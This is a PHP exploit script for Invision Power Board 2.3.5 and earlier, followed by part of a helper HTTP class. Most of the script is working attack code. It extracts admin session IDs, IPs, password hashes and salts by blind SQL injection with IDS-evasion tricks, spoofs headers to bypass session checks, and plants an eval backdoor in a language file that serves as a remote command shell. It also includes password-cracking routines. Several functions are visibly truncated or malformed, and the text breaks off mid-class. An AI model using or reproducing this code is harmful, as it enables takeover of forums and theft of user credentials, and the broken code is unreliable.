Invision Power Board <= 2.3.5 Multiple Vulnerabilities Exploit (revised)
========================================================================



#!/usr/bin/php -q
<?php
error_reporting(E_ALL ^ E_NOTICE);

# yeah ... it rox (:
class ipb_spl
{
	var $web;

	function main()
	{
		$this->mhead();
		
		# Gimme your args
		$this->p_attack = $this->get_p(&#039;attack&#039;, true);
		$this->p_prox   = $this->get_p(&#039;proxhost&#039;);
		$this->p_proxa  = $this->get_p(&#039;proxauth&#039;);
		
		$this->init_global();
		
		# Proxy params
		if( $this->p_prox )
		{
			$this->web->proxy($this->p_prox);
			
			if( $this->p_proxa )
			$this->web->proxyauth($this->p_proxa);
		}

		# Where do we go ?
		switch( $this->p_attack )
		{
			case 1:	 $this->code_exec();  break;
			case 2:  $this->bf_sql_pwd(); break;
			case 3:  $this->bf_usr_pwd(); break;
			default: $this->usage();
		}

		return;
	}
	
	function code_exec($loop=1)
	{
		# First loop
		if( $loop == 1 )
		{
			$this->set_sql_param();
			$this->set_sql_focus();
		
			$this->p_acp = $this->get_p(&#039;acp&#039;);
				
			# ACP path
			if( !$this->p_acp )
			{
				# If the user changed the ACP directory, we can
				# find it (if the "Remove ACP Link" option was not
				# applied) by log in as an Admin, and then click
				# on "Admin CP". This can be done with a user
				# but I didn&#039;t implemented that  ;) 
				$this->msg(&#039;Using default ACP path: admin&#039;, 1);
				$this->p_acp = &#039;admin&#039;;
			}
			else 
			$this->msg(&#039;Using ACP path "&#039;.$this->p_acp.&#039;"&#039;, 1);
		
			# Init client headers:
			# Only if we have the same IP as the targeted user (not admin),
			# it resets session datas, so we try to spoof our 
			# IP as a random one in order to keep user&#039;s session datas while
			# we bruteforce SQL fields.
			$this->bypass_matches();
		
			# Remove expired sessions ( time() - 60*60*2  =  > 2 hours )
			$this->web->get($this->p_url.$this->p_acp.&#039;/index.php?&#039;);
			$this->msg(&#039;Removed all out of date admin sessions&#039;, 1);
		
		}
				
		# Admin session ?
		$this->msg(&#039;Trying to find an admin session id&#039;, 0);
		
		# Got one :]
		if( $this->get_admin_sess() )
		{
			$this->s_admin = true;
			$this->s_sess  = $this->data[&#039;a_sess_id&#039;];
			$this->a_url   = $this->p_url.$this->p_acp.&#039;/index.php?adsess=&#039;.$this->s_sess;
		}
		
		# Nothing special
		else 
		{
			$this->s_admin = false;
			$this->msg(&#039;No admin session id found&#039;, -1);
		}
		
		# User session ?
		if( !$this->s_sess )
		{
			$this->msg(&#039;Trying to find a user session id&#039;, 0);
			
			# Yep
			if( $this->get_user_sess() )
			$this->s_sess = $this->data[&#039;u_sess_id&#039;];

			# F0ck
			else 
			{
				$this->msg(&#039;No user session id found&#039;, -1);
				$this->msg(&#039;Admin session > 2 hours or user logged out&#039;, 0);
				$this->msg(&#039;Keeping trying until the user connects&#039;, 0);
				$this->msg(&#039;Entering loop #&#039;.$loop.&#039; ...&#039;, 0);
				$this->code_exec(++$loop);
			}
		}
			
		$this->msg(&#039;Getting security options&#039;, 0);
		
		# Security options
		$this->get_sec_options();
		
		# IP filter ?
		if( $this->conf[&#039;ip&#039;] === &#039;1&#039; )
		{
			$this->s_bypass = true;
			
			$this->msg(&#039;IP filter option is turned on&#039;, 0);
			
			# Spoofing protection ?
			if( !$this->conf[&#039;xforward&#039;] )
			{
				# Assuming our IP isn&#039;t the same etc..
				$this->msg(&#039;Can\&#039;t bypass the IP filter&#039;, -1);
				exit(1);
			}
			
			# X-Forwarded-For / Client-IP /
			# Proxy-User / X-Cluster-Client-IP
			else 
			{
				$this->msg(&#039;Cool, we can spoof our IP (Client-IP)&#039;, 1);
				
				if( $this->s_admin )
				{
					$this->msg(&#039;Trying to find admin\&#039;s last IP&#039;, 0);
					
					# Admin IP found
					$this->get_admin_ip();
					$this->s_ip = $this->data[&#039;a_ip_addr&#039;];
				}
				else 
				{
					$this->s_admin = false;
					$this->msg(&#039;Trying to find user\&#039;s last used IP&#039;, 0);
					
					# User IP found
					$this->get_user_ip();
					$this->s_ip = $this->data[&#039;u_ip_addr&#039;];
				}
				
				# Nothing found
				if( !$this->s_ip )
				{
					# Ahah (:
					$this->msg(&#039;No IP found for this user&#039;, -1);
					$this->give_hope();
				}
				
				# Got one !
				else
				$this->msg(&#039;Ok, using IP &#039;.$this->s_ip, 1);
			}
		}
		
		# User-Agent filter ?
		if( $this->conf[&#039;browser&#039;] === &#039;1&#039; && !$this->s_admin )
		{
			$this->s_bypass = true;
			
			$this->msg(&#039;Trying to find a valid user-agent&#039;, 0);
			
			# Good
			if( $this->get_user_agent() )
			{
				$this->msg(&#039;Ok, using user-agent &#039;.substr($this->data[&#039;u_agent&#039;], 0, 10).&#039;...&#039;, 1);
				$this->s_agent = $this->data[&#039;u_agent&#039;];
			}
			
			# WTF :!
			else
			{
				$this->msg(&#039;No user-agent found for this user&#039;, -1);
				$this->msg(&#039;Maybe the browser didn\&#039;t send this header&#039;, 0);
				$this->s_agent = &#039;&#039;;
			}
			
		}

		# Cool !?
		if( !$this->s_bypass )
		$this->msg(&#039;Cool, nothing to bypass&#039;, 1);
		
		$this->msg(&#039;Trying to log in&#039;, 0);
		
		# Owned =]
		if( $this->is_logged() )
		{
			# PHP code
			if( $this->s_admin )
			{
				$this->msg(&#039;Logged in with an admin session&#039;, 1);
				$this->exec_code();
			}
			
			# Normal user ?
			else
			{
				$this->msg(&#039;Logged in with a user session&#039;, 1);
				$this->msg(&#039;You can log in using the cookie session_id&#039;, 1);

				if( $this->s_ip !== $this->def_ip )
				$this->msg(&#039;Set the Client-IP header to: &#039;.$this->s_ip, 1);
				
				if( $this->s_agent )
				$this->msg(&#039;Set the User-Agent header to: &#039;.$this->s_agent, 1);
				
				exit(0);
			}
		}
		else 
		{
			# Even if the admin logged out .. the admin session
			# is still valid  ;) 
			$this->msg(&#039;Can\&#039;t log in, the session has expired ?!&#039;, -1);
			$this->give_hope();
		}
		
		return;
	}
	
	function bf_sql_pwd()
	{
		$this->p_ip    = $this->get_p(&#039;ip&#039;, true);
		$this->p_dict  = $this->get_p(&#039;dict&#039;, true);
		
		$this->p_sql_u = $this->get_p(&#039;sqlusr&#039;);
		
		$this->p_url   = $this->get_p(&#039;url&#039;);
		$this->p_uname = $this->get_p(&#039;uname&#039;);
		$this->p_pwd   = $this->get_p(&#039;pwd&#039;);
		// or 
		$this->p_uid   = $this->get_p(&#039;uid&#039;);
		$this->p_hash  = $this->get_p(&#039;passhash&#039;);
		$this->p_shold = $this->get_p(&#039;stronghold&#039;);
		
		if( $this->p_uname && $this->p_pwd && $this->p_url )
		{
			
			$this->msg(&#039;Trying to get some cookies&#039;, 0);
			
			$g_dat = &#039;index.php?act=Login&CODE=01&CookieDate=1&#039;;
			$p_dat = &#039;UserName=&#039;.$this->p_uname.&#039;&PassWord=&#039;.$this->p_pwd.&#039;&x=0&y=0&#039;;
		
			$this->web->post($this->p_url.$g_dat, $p_dat);
		
		}
		elseif( !$this->p_uid || !$this->p_hash || !$this->p_shold )
		$this->usage();
		
		if( !$this->p_uid || !$this->p_hash || !$this->p_shold )
		{
			$this->msg(&#039;Can\&#039;t get cookies&#039;, -1);
			$this->msg(&#039;You should try with other parameters&#039;, -1);
			exit(1);
		}
		
		$this->msg(&#039;Ok, using cookies:&#039;, 1);
		
		$this->msg(&#039;member_id=&#039;.$this->p_uid, 1);
		$this->msg(&#039;pass_hash=&#039;.$this->p_hash, 1);
		$this->msg(&#039;ipb_stronghold=&#039;.$this->p_shold, 1);
		
		if( !$this->p_sql_u )
		{
			$this->set_sql_param();
			
			$this->msg(&#039;Trying to get the current sql user&#039;, 0);
			
			if( !$this->get_sql_user() )
			{
				$this->msg(&#039;Can\&#039;t get the sql user&#039;, -1);
				$this->msg(&#039;If you know the sql user, use -sqlusr&#039;, -1);
				exit(1);
			}
			else
			$this->p_sql_u = $this->data[&#039;sql_user&#039;];
		}
		
		$this->msg(&#039;Ok, using sql user &#039;.$this->p_sql_u, 1);
		
		$dico_c = file($this->p_dict);
		$ip_a   = explode(&#039;.&#039;, $this->p_ip);
		
		$this->msg(&#039;Entering local dictionnary attack (&#039;.count($dico_c).&#039; words)&#039;, 0);
		$this->msg(&#039;You should take a drink ...&#039;, 0);
		
		foreach( $dico_c as $line )
		{
			$md5 = md5(trim($line).$this->p_sql_u);
			$md5 = md5($this->p_uid.&#039;-&#039;.$ip_a[0].&#039;-&#039;.$ip_a[1].&#039;-&#039;.$this->p_hash).$md5;
			$md5 = md5($md5);

			if( $this->p_shold === $md5 )
			{
				$this->msg(&#039;Found something cool =]&#039;, 1);
				$this->msg(&#039;SQL password: &#039;.$line, 1);
				exit(1);
			}

		}
		
		$this->msg(&#039;End of the wordlist, password not found&#039;, -1);
		
		return;
	}

	function bf_usr_pwd()
	{
		$this->p_dict  = $this->get_p(&#039;dict&#039;, true);

		$this->p_hash  = $this->get_p(&#039;passhash&#039;);
		$this->p_salt  = $this->get_p(&#039;salt&#039;);
		
		if( !$this->p_hash || !$this->p_salt )
		{
			$this->set_sql_param();
			$this->set_sql_focus();
		}
		
		if( !$this->p_hash )
		{
			$this->msg(&#039;Trying to get the password hash&#039;, 0);
			
			if( !$this->get_pass_hash() )
			{
				$this->msg(&#039;Can\&#039;t get the password hash&#039;, -1);
				exit(1);
			}
			else 
			$this->p_hash = $this->data[&#039;pass_hash&#039;];
		}
		
		$this->msg(&#039;Ok, using hash &#039;.$this->p_hash, 1);
		
		if( !$this->p_salt )
		{
			$this->msg(&#039;Trying to get the password salt&#039;, 0);
			
			if( !$this->get_pass_salt() )
			{
				$this->msg(&#039;Can\&#039;t get the password salt&#039;, -1);
				exit(1);
			}
			else 
			$this->p_salt = $this->data[&#039;pass_salt&#039;];
		}
		
		$this->msg(&#039;Ok, using salt &#039;.$this->p_salt, 1);
		
		$dico_c = file($this->p_dict);
		
		$this->msg(&#039;Entering local dictionnary attack (&#039;.count($dico_c).&#039; words)&#039;, 0);
		$this->msg(&#039;You should take a drink ...&#039;, 0);
		
		foreach( $dico_c as $line )
		{
			if( $this->p_hash === md5(md5($this->p_salt).md5(trim($line))) )
			{
				$this->msg(&#039;Found something cool =]&#039;, 1);
				$this->msg(&#039;User password: &#039;.$line, 1);
				exit(1);
			}
		}
		
		$this->msg(&#039;End of the wordlist, password not found&#039;, -1);
		
		return;
	}
	
	function set_sql_param()
	{
		$this->p_url   = $this->get_p(&#039;url&#039;, true);
		
		{
		}
		else 

	}
	
	function set_sql_focus()
	{
		$this->p_uname = $this->get_p(&#039;uname&#039;);
		$this->p_uid   = $this->get_p(&#039;uid&#039;);
		
		if( $this->p_uname )
		$this->msg(&#039;Using targeted username &#039;.$this->p_uname, 1);
		
		elseif( $this->p_uid )
		$this->msg(&#039;Using targeted user id &#039;.$this->p_uid, 1);
		
		# Target
		if( !($this->p_uname || $this->p_uid) )
		{
			$this->msg(&#039;Using default user id: 1&#039;, 1);
			$this->p_uid = 1;
		}

		# Focus on ?
		if( $this->p_uname )
		$this->t_on = &#039;members_l_username=\&#039;&#039;.addslashes($this->p_uname).&#039;\&#039;&#039;;
		
		else 
		$this->t_on = &#039;id=&#039;.(int)$this->p_uid;
		
		return;
	}
	
	function exec_code()
	{
		$this->write_code();
		
		while( $this->cmd_prompt() )
		{
			$this->web->addheader(&#039;My-Code&#039;, $this->cmd);
			$this->web->get($this->p_url);

			print "\n".$this->get_answer();
		}
		
		exit(0);
	}
	
	function get_answer()
	{
		$res_a = explode($this->res_sep, $this->web->getcontent());
		
		if( !$res_a[1] )
		return &#039;No result to retrieve&#039;;
		
		else 
		return $res_a[1];
	}
	
	function cmd_prompt()
	{
		$this->cmd = $this->msg(&#039;root@ipb: &#039;, 1, 1, 0, true);
		
		if( !ereg(&#039;^(quit|exit)$&#039;, $this->cmd) )
		{		
			$this->cmd = base64_encode($this->cmd);
			$this->cmd = str_replace(&#039;%CMD%&#039;, $this->cmd, $this->php_send);
			
			return TRUE;
		}

		else
		   return FALSE;
	}
	
	function write_code()
	{
		# Gimme the language ID
		$this->get_def_lang();
		
		# Current lang settings
		$p_dat =
		&#039;code=edit2&act=lang&id=&#039;.$this->g_lid.&#039;&section&#039;.
		&#039;=lookandfeel&lang_file=lang_boards.php&#039;;
		
		$this->web->post($this->a_url, $p_dat);

		# We collect each variable name / value
		{
			# POST data 
			$p_dat =
			&#039;code=doedit&act=lang&id=&#039;.$this->g_lid.
			&#039;&lang_file=lang_boards.php&section=lo&#039;.
			&#039;okandfeel&&#039;;

			# &Name=Value
			for( $i=0; $i<count($l_vars[0]); $i++ )
			{
				$p_dat .=
				&#039;&XX_&#039;.$l_vars[1][$i].&#039;=&#039;.urlencode($l_vars[2][$i]);
				
				# We write our PHP code in the first variable
				if( $i == 0 )
				$p_dat .= $this->php_write;
			}
			
			# Go on
			$this->web->post($this->a_url, $p_dat);
			
			$this->msg(&#039;PHP code written&#039;, 1);
		}
		else
		{
			# WTF :!
			$this->msg(&#039;Can\&#039;t find block variables&#039;, 0);
			exit(1);
		}
		
		return;
	}
	
	function get_def_lang()
	{
		$this->msg(&#039;Trying to get the set language id&#039;, 0);
		
		$this->web->get($this->a_url.&#039;&section=lookandfeel&act=lang&#039;);
		
		{
			$this->g_lid = $lids[1];
			$this->msg(&#039;Using language id &#039;.$this->g_lid, 1);
		}
		else 
		{
			$this->msg(&#039;Can\&#039;t get the default language id&#039;, -1);
			exit(1);
		}
		
		return;
	}
	
	function is_logged()
	{
		$this->bypass_matches();

		# User session ok ?
		if( !$this->s_admin )
		{
			$match = &#039;act=Login&CODE=03&#039;;
			$this->web->get($this->p_url);
		}
		
		# Admin session ok ?
		else
		{
			$match = &#039;&section=&#039;;
			$this->web->get($this->a_url);
		}
		
		return true;
		
		else 
		return false;		
	}
	
	function bypass_matches()
	{
		# match_browser
		$this->web->agent($this->s_agent);
		
		# match_ipaddress
		$this->web->addheader(&#039;Client-IP&#039;, $this->s_ip);
		
		return;
	}
	
	{
				
		# Set-Cookie: session_id=...; path=/
		$this->web->get($this->p_url);
		
		
		if( $this->web->cookie )
		{
			foreach( $this->web->cookie as $name => $value)
			{
				{
					break;
				}
			}
		}
		
		
		else 
		
		return;
	}
	
	function get_sec_options()
	{
		# If no value, take the default one
		$this->get_conf(&#039;t.conf_value&#039;);
		$this->get_conf(&#039;t.conf_default&#039;);
		
		return;
	}
	
	function get_conf($field)
	{
		$this->init_sql();
		
		$this->t_table = &#039;conf_settings&#039;;	
		$this->t_field = $field;
		$this->t_char  = $this->chr_num;
		
		$this->t_add_0 = "AND t.conf_key=&#039;match_browser&#039;";

		if( $this->conf[&#039;browser&#039;] === &#039;&#039; )
		$this->conf[&#039;browser&#039;] = $this->bf_inj();

		$this->t_add_0 = "AND t.conf_key=&#039;match_ipaddress&#039;";
		
		if( $this->conf[&#039;ip&#039;] === &#039;&#039; )
		$this->conf[&#039;ip&#039;] = $this->bf_inj();
		
		$this->t_add_0 = "AND t.conf_key=&#039;xforward_matching&#039;";
		
		if( $this->conf[&#039;xforward&#039;] === &#039;&#039; )
		$this->conf[&#039;xforward&#039;] = $this->bf_inj();

		return;
	}
	
	function get_login_key()
	{
		$this->init_sql();
		
		$this->t_key             = &#039;login_key&#039;;
		$this->t_table           = &#039;members&#039;;
		$this->t_field           = &#039;t.member_login_key&#039;;
		$this->t_join            = &#039;t.id=m.id&#039;;
		$this->t_char            = $this->chr_md5;
		$this->data[&#039;login_key&#039;] = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_sql_user()
	{
		$this->init_sql();
		
		$this->t_key             = &#039;user()&#039;;
		$this->t_table           = &#039;members&#039;;
		$this->t_field           = &#039;user()&#039;;
		$this->t_char            = $this->chr_all;
		$this->t_end             = &#039;@&#039;;
		$this->data[&#039;sql_user&#039;]  = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_pass_hash()
	{
		$this->init_sql();
		
		$this->t_key             = &#039;pass_hash&#039;;
		$this->t_table           = &#039;members_converge&#039;;
		$this->t_field           = &#039;t.converge_pass_hash&#039;;
		$this->t_join            = &#039;t.converge_email=m.email&#039;;
		$this->t_char            = $this->chr_md5;
		$this->data[&#039;pass_hash&#039;] = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_pass_salt()
	{	
		$this->init_sql();
		
		$this->t_key             = &#039;pass_salt&#039;;
		$this->t_table           = &#039;members_converge&#039;;
		$this->t_field           = &#039;t.converge_pass_salt&#039;;
		$this->t_join            = &#039;t.converge_email=m.email&#039;;
		$this->t_char            = $this->chr_all;
		$this->data[&#039;pass_salt&#039;] = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_admin_sess()
	{
		$this->init_sql();
		
		$this->t_key             = &#039;admin_sid&#039;;
		$this->t_table           = &#039;admin_sessions&#039;;
		$this->t_field           = &#039;t.session_id&#039;;
		$this->t_join            = &#039;t.session_member_id=m.id&#039;;
		$this->t_sel             = &#039;t.session_log_in_time&#039;;
		$this->t_char            = $this->chr_md5;
		$this->data[&#039;a_sess_id&#039;] = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_admin_ip()
	{
		$this->init_sql();
		
		$this->t_key             = &#039;admin_ip&#039;;
		$this->t_table           = &#039;admin_sessions&#039;;
		$this->t_field           = &#039;t.session_ip_address&#039;;
		$this->t_join            = &#039;t.session_member_id=m.id&#039;;
		$this->t_sel             = &#039;t.session_log_in_time&#039;;
		$this->t_char            = $this->chr_ip;
		$this->data[&#039;a_ip_addr&#039;] = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_admin_pwd()
	{
		$this->init_sql();
		
		$this->t_key             = &#039;admin_pwd&#039;;
		$this->t_table           = &#039;admin_login_logs&#039;;
		$this->t_field           = &#039;t.admin_post_details&#039;;
		$this->t_join            = &#039;t.admin_username=m.members_l_username&#039;;
		$this->t_sel             = &#039;t.admin_id&#039;;
		$this->t_end             = &#039;"&#039;;
		$this->t_bchar           = -4; # ";}}
		$this->t_char            = $this->chr_all;
		$this->data[&#039;a_pwd_like&#039;]= $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_user_sess()
	{
		$this->init_sql();
		
		$this->t_key             = &#039;user_sid&#039;;
		$this->t_table           = &#039;sessions&#039;;
		$this->t_field           = &#039;t.id&#039;;
		$this->t_join            = &#039;t.member_id=m.id&#039;;
		$this->t_sel             = &#039;t.running_time&#039;;
		$this->t_char            = $this->chr_md5;
		$this->data[&#039;u_sess_id&#039;] = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_user_ip()
	{
		$this->init_sql();
		
		$this->t_key             = &#039;user_ip&#039;;
		$this->t_table           = &#039;sessions&#039;;
		$this->t_field           = &#039;t.ip_address&#039;;
		$this->t_join            = &#039;t.member_id=m.id&#039;;
		$this->t_sel             = &#039;t.running_time&#039;;
		$this->t_char            = $this->chr_ip;
		$this->data[&#039;u_ip_addr&#039;] = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function get_user_agent()
	{
		$this->init_sql();
		
		$this->t_key             = &#039;user_agent&#039;;
		$this->t_table           = &#039;sessions&#039;;
		$this->t_field           = &#039;t.browser&#039;;
		$this->t_join            = &#039;t.member_id=m.id&#039;;
		$this->t_sel             = &#039;t.running_time&#039;;
		$this->t_char            = $this->chr_all;
		$this->data[&#039;u_agent&#039;]   = $this->bf_inj();
		
		return $this->key_val;
	}
	
	function init_sql()
	{
		# SQL Injection params
		$this->t_end   = null;
		$this->t_add_0 = &#039;&#039;;
		$this->t_add_1 = &#039;&#039;;
		$this->t_sel   = &#039;1&#039;;
		$this->t_bchar = 0;
		$this->t_join  = &#039;&#039;;
		$this->t_key   = &#039;&#039;;
		$this->t_add_1 = &#039;ORDER BY id DESC LIMIT 1&#039;;
		
		return;
	}
	
	function init_global()
	{
		# Charsets
		$this->chr_spe = str_split(&#039; :/;*(-.!,?Â§*Âµu%$?^?=+})Â°]ac^_\\`e|[\&#039;{#e~&?"@&#039;);
		$this->chr_num = range(0, 9);
		$this->chr_md5 = array_merge( $this->chr_num, range(&#039;a&#039;, &#039;f&#039;) );
		$this->chr_ip  = array_merge( $this->chr_num, array(&#039;.&#039;) );
		$this->chr_all = array_merge( $this->chr_num, range(&#039;a&#039;, &#039;z&#039;) );
		$this->chr_all = array_merge( range(&#039;A&#039;, &#039;Z&#039;), $this->chr_all, $this->chr_spe );

		# SQL Injection
		$this->def_param = &#039;index.php?s=&act=xmlout&do=check-display-name&name=%rep_inj%&#039;;
	
		# IDS Evasion via %0D
		$this->def_inj   = "&#039; OR 1=\"&#039;\" U%0DNION %rep_req% OR 1=\"&#039;\" %rep_add% #";
		
		# Results
		$this->data = array();
		$this->conf = array(&#039;ip&#039; => &#039;&#039;, &#039;browser&#039; => &#039;&#039;, &#039;xforward&#039; => &#039;&#039;);
		
		# Misc
		$this->stat     = array(-1 => &#039;-&#039;, 0 => &#039;/&#039;, 1 => &#039;+&#039;);
		$this->s_bypass = false;
		$this->res_sep  = md5(rand());
		$this->def_ip   = rand(0,255).&#039;.&#039;.rand(0,255).&#039;.&#039;.rand(0,255).&#039;.&#039;.rand(0,255);
		
		# PHP Code
		$this->php_write = &#039;${${@eval($_SERVER[HTTP_MY_CODE])}}&#039;;
		$this->php_send	 = "print(&#039;$this->res_sep&#039;);@system(base64_decode(&#039;%CMD%&#039;));";
		$this->php_send .= "print(&#039;$this->res_sep&#039;);exit(0);";
		
		# Regex
		$this->reg_lang = &#039;#</span></td>[\r\n]*.*[\r\n]*.*code=export&id=([0-9]+)#i&#039;;
		$this->reg_lvar = "#id=&#039;XX_([\w]+)&#039;[\x20]+class=&#039;multitext&#039;>(.*)</textarea></td>#i";
		# $this->reg_acp  = &#039;#<a href="(.*)"[\x20]+target="_blank"#i&#039;;
		
		# Default client headers
		$this->s_agent = &#039;Mozilla Firefox&#039;;
		$this->s_ip    = $this->def_ip;
		
		return;
	}
	
	function bf_inj()
	{
		$this->sub_chr = $this->t_bchar;
		$this->key_val = &#039;&#039;;
			
		if( !empty($this->t_key) )
		$this->msg(&#039;&#039;, 0);
		
		while( true )
		{
			if( $this->t_bchar < 0 )
			$this->sub_chr--;
			
			else
			$this->sub_chr++;
	
			# 0-9a-f
			for( $j=0;$j<=count($this->t_char);$j++ )
			{
				# That one ?
				$chr = $this->t_char[$j];
				
				# Latest char ?
				if( $j === count($this->t_char) )
				$chr = $this->t_end;
				
				# Ascii num
				$asc = ord($chr);
				
				# Screen bug
				if( !empty($this->t_key) ) 
				{
					$msg  = $this->t_key.&#039;=&#039;.$this->key_val;
					$msg .= ($chr === $this->t_end ? "\x20" : $chr);
					
					$this->msg($msg, 0, 1, 1);
				}
				
				# Focus on the target ?
				if( !empty($this->t_join) )
				{
					$inj = 
					&#039; AND m.&#039;.$this->t_on.&#039; AND ASC%0DII(SUBS%0DTR(&#039;.$this->t_field.
					&#039;,&#039;.$this->sub_chr.&#039;,1))=&#039;.$asc.&#039; &#039;.$this->t_add_0;
				}
				else 
				{
					$inj =
					&#039; t WH%0DERE ASC%0DII(SUB%0DSTR(&#039;.$this->t_field.&#039;,&#039;.$this->sub_chr.
					&#039;,1))=&#039;.$asc.&#039; &#039;.$this->t_add_0;
				}

				# SQL Injection via rawurldecode()
				$inj = str_replace(&#039;%rep_req%&#039;, $inj, $this->def_inj);
				$inj = str_replace(&#039;%rep_add%&#039;, $this->t_add_1, $inj);
				$inj = str_replace(array(&#039;"&#039;, "&#039;"), array(&#039;%2522&#039;, &#039;%2527&#039;), $inj);
				
				# Params
				$inj = str_replace(&#039;%rep_inj%&#039;, $inj, $this->def_param);
				$inj = str_replace(array(&#039; &#039;, &#039;#&#039;), array(&#039;%20&#039;, &#039;%23&#039;), $inj);
				
				$this->web->get($this->p_url.$inj);

				# Ok !?
				if( !strstr($this->web->getcontent(), &#039;notfound&#039;) )
				{
					if( $chr !== $this->t_end )
					{	
						$this->key_val .= $chr;
						break;
					}
				}
				
				# End
				if( $chr === $this->t_end )
				{
					# Reverse
					if( $this->t_bchar < 0 )
					$this->key_val = strrev($this->key_val);
					
					if( !empty($this->t_key) ) 
					$this->msg($this->t_key.&#039;=&#039;.$this->key_val, 1, 1, 1);

					return $this->key_val;
				}
			}
		}
		
	}
	
	function get_p($p, $exit=false)
	{
		global $argv;
		
		foreach( $argv as $key => $value )
		{
			if( $value === &#039;-&#039;.$p )
			{
				if( isset($argv[$key+1]) && !empty($argv[$key+1]) )
				{					
					return $argv[$key+1];
				}
				else
				{
					if( $exit )
					$this->usage();
					
					return true;
				}
			}
		}
		
		if( $exit )
		$this->usage();
		
		return false;
	}
	
	function msg($msg, $nstatus, $nspace=1, $ndel=0, $ask=false)
	{
		if( $ndel ) $type = "\r";
		else        $type = "\n";
		
		# wtf (:
		print
		(
			$type.str_repeat("\x20", $nspace).
			$this->stat[$nstatus]."\x20".$msg
		);
		
		if( $ask )
		return trim(fgets(STDIN));
	}
	
	function give_hope()
	{				
		$this->msg(&#039;You should try with another user or try another time&#039;, -1);
			
		exit(1);
	}
	
	function mhead()
	{
		# Advisory: http://acid-root.new.fr/?0:18
		
		print "\n Invision Power Board <= 2.3.5 Multiple Vulnerabilities";
		print "\n ------------------------------------------------------";
		print "\n\n About:";
		print "\n\n by DarkFig < gmdarkfig (at) gmail (dot) com >";
		print "\n http://acid-root.new.fr/";
		print "\n #acidroot@irc.worldnet.net";
		print "\n\n\n Attack(s):\n";
		
		return;
	}
	
	function usage()
	{

		print "\n -attack <int_choice> <params> [options]\n\n";
		print "  1 - PHP code execution\n\n";
		print "    -url        IPB url with ending slash\n\n";
		print "    -uname      targeted username\n";
		print "    -uid        OR the targeted user id (def: 1)\n\n";
		print "    -acp        admin control panel path (def: admin)\n\n\n";
		print "  2 - Insecure SQL password usage\n\n";
		print "    -ip         your current IP\n";
		print "    -dict       a wordlist file\n\n";
		print "    -url        IPB url with ending slash\n";
		print "    -uname      a valid member username\n";
		print "    -pwd        the associated password\n\n";
		print "    -uid        OR  the targeted member id\n";
		print "    -passhash   the passhash cookie value\n";
		print "    -stronghold the stronghold cookie value\n\n";
		print "  3 - Password bruteforcer\n\n";
		print "    -dict       a wordlist file\n\n";
		print "    -url        IPB url with ending slash\n";
		print "    -uname      targeted username\n";
		print "    -uid        OR  the targeted user id (def: 1)\n";
		print "    -passhash   OR the passhash value\n";
		print "    -salt       the salt value\n\n\n";
		print "  Optional: \n\n";
		print "    -proxhost <ip>       if you wanna use a proxy\n";
		print "    -proxauth <usr:pwd>  proxy with authentication\n";
		
		exit(1);
	}
	
}



/*
 * 
 * Copyright (C) darkfig
 * 
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 * TITLE:          PhpSploit Class
 * REQUIREMENTS:   PHP 4 / PHP 5
 * VERSION:        2.1
 * LICENSE:        GNU General Public License
 * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
 * FILENAME:       phpsploitclass.php
 *
 * CONTACT:        gmdarkfig@gmail.com (french / english)
 * GREETZ:         Sparah, Ddx39
 *
 * DESCRIPTION:
 * The phpsploit is a class implementing a web user agent.
 * You can add cookies, headers, use a proxy server with (or without) a
 * basic authentification. It supports the GET and the POST method. It can
 * also be used like a browser with the cookiejar() function (which allow
 * a server to add several cookies for the next requests) and the
 * allowredirection() function (which allow the script to follow all
 * redirections sent by the server). It can return the content (or the
 * headers) of the request. Others useful functions can be used for debugging.
 * A manual is actually in development but to know how to use it, you can
 * read the comments.
 *
 * CHANGELOG:
 *
 * [2008-08-29] (2.1)
 *  * New: The showheader()/showcookie() functions can now return an array
 *  * Bug #3 fixed: Problem concerning some servers for the main function
 *
 * [2007-06-10] (2.0)
 *  * Code: Code optimization
 *  * New: Compatible with PHP 4 by default
 *
 * [2007-01-24] (1.2)
 *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
 *  * New: multipart/form-data enctype is now supported 
 *
 * [2006-12-31] (1.1)
 *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
 *  * New: You can now call the getheader() / getcontent() function without parameters
 *
 * [2006-12-30] (1.0)
 *  * First version
 * 
 */

class phpsploit
{
	var $proxyhost;
	var $proxyport;
	var $host;
	var $path;
	var $port;
	var $method;
	var $url;
	var $packet;
	var $proxyuser;
	var $proxypass;
	var $header;
	var $cookie;
	var $data;
	var $boundary;
	var $allowredirection;
	var $last_redirection;
	var $cookiejar;
	var $recv;
	var $cookie_str;
	var $header_str;
	var $server_content;
	var $server_header;
	

	/**
	 * This function is called by the
	 * get()/post()/formdata() functions.
	 * You don&#039;t have to call it, this is
	 * the main function.
	 *
	 * @access private
	 * @return string $this->recv ServerResponse
	 * 
	 */
	function sock()
	{
		if(!empty($this->proxyhost) && !empty($this->proxyport))
		   $socket = @fsockopen($this->proxyhost,$this->proxyport);
		else
		   $socket = @fsockopen($this->host,$this->port);
	
		if(!$socket)
		   die("Error: Host seems down");
		
		if($this->method==&#039;get&#039;)
		   $this->packet = &#039;GET &#039;.$this->url." HTTP/1.1\r\n";
		   
		elseif($this->method==&#039;post&#039; or $this->method==&#039;formdata&#039;)
		   $this->packet = &#039;POST &#039;.$this->url." HTTP/1.1\r\n";
		   
		else
		   die("Error: Invalid method");
		
		if(!empty($this->proxyuser))
		   $this->packet .= &#039;Proxy-Authorization: Basic &#039;.base64_encode($this->proxyuser.&#039;:&#039;.$this->proxypass)."\r\n";
		
